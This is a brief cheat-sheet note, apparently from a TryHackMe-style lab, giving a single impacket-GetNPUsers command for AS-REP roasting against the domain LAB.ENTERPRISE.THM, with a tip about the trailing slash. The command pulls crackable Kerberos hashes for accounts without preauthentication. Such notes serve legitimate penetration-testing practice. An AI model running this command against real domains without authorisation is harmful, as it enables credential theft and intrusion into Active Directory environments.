## ASREP roast with Get-NPUsers
note that the domain must end in a /
```bash
impacket-GetNPUsers -request -usersfile users -dc-ip $IP LAB.ENTERPRISE.THM/
```

